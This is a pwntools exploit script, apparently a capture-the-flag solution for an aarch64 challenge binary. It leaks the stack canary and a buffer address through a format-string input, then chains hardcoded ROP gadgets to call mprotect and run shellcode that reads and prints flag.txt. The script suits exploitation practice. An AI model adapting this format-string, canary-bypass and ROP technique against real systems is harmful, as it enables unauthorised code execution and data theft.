from pwn import *

context.arch = 'aarch64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chal', '''
    b *(main+176)
    b *(main+224)
    b *(main+284)
    continue
''')

p.sendafter(b"[Commander Neil Armstrong]: The Lunar module Eagle has successfully landed at the Sea of Tranquility!\n", b'%25$p%26$p')
p.recvuntil(b"[Houston]: ")
canary_val = int(p.recv(18), 16)
log.info(f"canary value: {hex(canary_val)}")
buffer_addr = int(p.recv(14), 16)-0xa0
log.info(f"buffer address: {hex(buffer_addr)}")

CANARY_VALUE = canary_val
EXECUTABLE_START_ADDR = buffer_addr&~0xfff
FAKE_X = 0x496e00
FLAG_CONTENT_ADDR = 0x496f00
FLAG_FILENAME_ADDR = buffer_addr+8
LIBC_MPROTECT = 0x416a00
LIBC_MPROTECT_ADDR = buffer_addr
SHELLCODE_ADDR = buffer_addr+0x18

GADGET_1 = 0x441e20  # ldp x19, x20, [sp, #0x10]; ldp x21, x22, [sp, #0x20]; ldp x23, x24, [sp, #0x30]; ldp x25, x26, [sp, #0x40]; ldp x29, x30, [sp], #0x50; ret;
GADGET_2 = 0x441700  # mov x2, x26; mov x1, x24; mov w7, #0; mov w6, #0; blr x22;
GADGET_3 = 0x40807c  # ldr x3, [x20, #0x80]; mov x0, x19; blr x3; tbnz x0, #0x3f, #0x84d4; str x0, [x19, #0x90]; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x30; ret;

shellcode = asm(f'''
    /* openat(AT_FDCWD, "./flag.txt", O_RDONLY) */
    mov x0, #-100
    movz x1, #{FLAG_FILENAME_ADDR&0xffff}, lsl #0
    movk x1, #{(FLAG_FILENAME_ADDR>>16) & 0xffff}, lsl #16
    movk x1, #{(FLAG_FILENAME_ADDR>>32) & 0xffff}, lsl #32
    movk x1, #{(FLAG_FILENAME_ADDR>>48) & 0xffff}, lsl #48
    mov x2, #0
    mov x8, #56
    svc #0
    /* read(fd, FLAG_CONTENT_ADDR, 128) */
    movz x1, #{FLAG_CONTENT_ADDR&0xffff}, lsl #0
    movk x1, #{(FLAG_CONTENT_ADDR>>16)&0xffff}, lsl #16
    movk x1, #{(FLAG_CONTENT_ADDR>>32)&0xffff}, lsl #32
    movk x1, #{(FLAG_CONTENT_ADDR>>48)&0xffff}, lsl #48
    mov x2, #128
    mov x8, #63
    svc #0
    /* write(1, FLAG_CONTENT_ADDR, 128) */
    mov x0, #1
    mov x8, #64
    svc #0
    /* exit(0) */
    mov x0, #0
    mov x8, #93
    svc #0
''')

payload = p64(LIBC_MPROTECT)+b'./flag.txt'.ljust(0x10, b'\x00')+bytes(shellcode)+cyclic(0x88-8-0x10-len(bytes(shellcode)))+p64(CANARY_VALUE)+p64(FAKE_X)+p64(GADGET_1)+p64(FAKE_X)+p64(GADGET_2)+p64(EXECUTABLE_START_ADDR)+p64(LIBC_MPROTECT_ADDR-0x80)+p64(FAKE_X)+p64(GADGET_3)+p64(0)+p64(0x2000)+p64(FAKE_X)+p64(7)+p64(FAKE_X)+p64(SHELLCODE_ADDR)+p64(FAKE_X)+p64(FAKE_X)
p.send(payload)

p.interactive()